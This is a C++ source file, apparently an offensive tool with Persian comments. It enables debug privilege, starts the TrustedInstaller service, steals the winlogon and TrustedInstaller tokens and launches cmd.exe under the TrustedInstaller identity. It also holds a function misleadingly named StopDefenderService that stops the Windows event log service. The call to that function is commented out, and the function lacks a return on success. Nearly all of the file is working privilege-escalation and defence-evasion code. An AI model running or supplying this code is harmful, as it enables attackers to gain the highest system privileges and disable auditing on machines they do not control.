#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <Lmcons.h> 
#include <vector>
#pragma comment(lib, "Secur32.lib")

BOOL StartTrustedInstallerService() {
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (NULL == schSCManager)
	{
		printf("[-] OpenSCManager failed (%d)\n", GetLastError());
		return FALSE;
	}
	printf("[+] OpenSCManager success!\n");

	SC_HANDLE schService = OpenService(schSCManager, L"TrustedInstaller", SERVICE_START);

	if (schService == NULL)
	{
		printf("[-] OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return FALSE;
	}

	if (!StartService(schService, 0, NULL))
	{
		if (ERROR_SERVICE_ALREADY_RUNNING == GetLastError())
		{
			printf("[+] Trusted Installer Already running\n");
			SetLastError(0);
		}
		else
		{
			printf("[-] TrustedInstaller Start Service failed (%d)\n", GetLastError());
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return FALSE;
		}
	}

	Sleep(2000);
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	return TRUE;
}

DWORD GetProcessByName(PCWSTR name)
{
	DWORD pid = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W process;  // استفاده از PROCESSENTRY32W برای Unicode
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	if (Process32FirstW(snapshot, &process))  // استفاده از Process32FirstW
	{
		do
		{
			if (wcscmp(process.szExeFile, name) == 0)
			{
				pid = process.th32ProcessID;
				break;
			}
		} while (Process32NextW(snapshot, &process));  // استفاده از Process32NextW
	}

	CloseHandle(snapshot);
	return pid;
}

void PrintDomainUserFromToken(HANDLE token)
{
	DWORD size = 0;
	GetTokenInformation(token, TokenUser, NULL, 0, &size);

	std::vector<BYTE> buffer(size);
	if (GetTokenInformation(token, TokenUser, buffer.data(), size, &size))
	{
		TOKEN_USER* user = reinterpret_cast<TOKEN_USER*>(buffer.data());
		WCHAR name[256], domain[256];
		DWORD nameLen = 256, domainLen = 256;
		SID_NAME_USE use;

		if (LookupAccountSidW(NULL, user->User.Sid, name, &nameLen, domain, &domainLen, &use))
		{
			wprintf(L"[+] Token user: %ls\\%ls\n", domain, name);
		}
	}
}

BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

BOOL StopDefenderService()
{
	SERVICE_STATUS_PROCESS ssp;
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (schSCManager == NULL)
	{
		printf("[-] OpenSCManager failed (%d)\n", GetLastError());
		return FALSE;
	}
	printf("[+] OpenSCManager success!\n");
	SC_HANDLE schService = OpenService(schSCManager, L"eventlog", SERVICE_STOP | SERVICE_QUERY_STATUS);
	if (schService == NULL)
	{
		printf("[-] OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return FALSE;
	}
	printf("[+] OpenService success!\n");

	if (!ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
	{
		printf("[-] ControlService failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return FALSE;
	}
}

int main(int argc, char** argv)
{
	HANDLE winlogonTokenHandle = NULL;  // توکن Winlogon
	HANDLE tiTokenHandle = NULL;        // توکن TrustedInstaller
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	WCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;

	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	if (EnableDebugPrivilege()) {
		printf("[+] Debug privilege enabled\n");
	}
	else {
		printf("[-] Failed to enable debug privilege (%d)\n", GetLastError());
	}

	if (StartTrustedInstallerService())
	{
		printf("[+] TrustedInstaller Service Started!\n");
	}
	else
	{
		exit(1);
	}

	DWORD PID_TO_IMPERSONATE = GetProcessByName(L"winlogon.exe");
	if (PID_TO_IMPERSONATE == 0)
	{
		printf("[-] Winlogon process not found\n");
		exit(1);
	}
	else
	{
		printf("[+] Winlogon process found! PID: %d\n", PID_TO_IMPERSONATE);
	}

	DWORD TI_PROCESS = GetProcessByName(L"TrustedInstaller.exe");
	if (TI_PROCESS == 0)
	{
		printf("[-] TrustedInstaller process not found\n");
		exit(1);
	}
	else
	{
		printf("[+] TrustedInstaller process found! PID: %d\n", TI_PROCESS);
	}

	// مرحله 1: گرفتن توکن Winlogon
	HANDLE winlogonProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, PID_TO_IMPERSONATE);
	if (winlogonProcessHandle == NULL) {
		printf("[-] WINLOGON OpenProcess() failed: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] WINLOGON OpenProcess() success!\n");

	BOOL getWinlogonToken = OpenProcessToken(winlogonProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &winlogonTokenHandle);
	if (!getWinlogonToken) {
		printf("[-] WINLOGON OpenProcessToken() failed: %d\n", GetLastError());
		CloseHandle(winlogonProcessHandle);
		exit(1);
	}
	printf("[+] WINLOGON OpenProcessToken() success!\n");

	BOOL impersonateUser = ImpersonateLoggedOnUser(winlogonTokenHandle);
	if (impersonateUser) {
		printf("[+] WINLOGON ImpersonateLoggedOnUser() success!\n");
		PrintDomainUserFromToken(winlogonTokenHandle);

		username_len = UNLEN + 1;
		if (GetUserNameW(username, &username_len)) {
			wprintf(L"[+] Current user is: %ls\n", username);
		}
	}
	else {
		printf("[-] WINLOGON ImpersonateLoggedOnUser() failed: %d\n", GetLastError());
	}

	CloseHandle(winlogonProcessHandle);

	// مرحله 2: گرفتن توکن TrustedInstaller
	HANDLE tiProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, TI_PROCESS);
	if (tiProcessHandle == NULL) {
		printf("[-] TrustedInstaller OpenProcess() failed: %d\n", GetLastError());

		// امتحان با دسترسی محدود
		tiProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, TI_PROCESS);
		if (tiProcessHandle == NULL) {
			printf("[-] TrustedInstaller OpenProcess() (limited) failed: %d\n", GetLastError());

			// cleanup
			if (tiProcessHandle) CloseHandle(tiProcessHandle);
			exit(1);
		}
		else {
			printf("[+] TrustedInstaller OpenProcess() (limited) success!\n");
		}
	}
	else {
		printf("[+] TrustedInstaller OpenProcess() success!\n");
	}


	BOOL getTiToken = OpenProcessToken(tiProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tiTokenHandle);
	if (!getTiToken) {
		printf("[-] TrustedInstaller OpenProcessToken() failed: %d\n", GetLastError());
		CloseHandle(tiProcessHandle);
		exit(1);
	}
	printf("[+] TrustedInstaller OpenProcessToken() success!\n");

	BOOL impersonateTiUser = ImpersonateLoggedOnUser(tiTokenHandle);
	if (impersonateTiUser) {
		printf("[+] TrustedInstaller ImpersonateLoggedOnUser() success!\n");
		PrintDomainUserFromToken(tiTokenHandle);

		username_len = UNLEN + 1;
		if (GetUserNameW(username, &username_len)) {
			wprintf(L"[+] Current user is: %ls\n", username);
		}
	}
	else {
		printf("[-] TrustedInstaller ImpersonateLoggedOnUser() failed: %d\n", GetLastError());
	}

	BOOL duplicateToken = DuplicateTokenEx(tiTokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);

	CloseHandle(tiTokenHandle);




	//if (StopDefenderService())
	//{
	//	printf("[+] TRUSTEDINSTALLER StopDefenderService() success!\n");
	//}
	//else
	//{
	//	printf("[+] TRUSTEDINSTALLER StopDefenderService() Error : %i!\n", GetLastError());
	//}

	getchar();
	return 0;
}
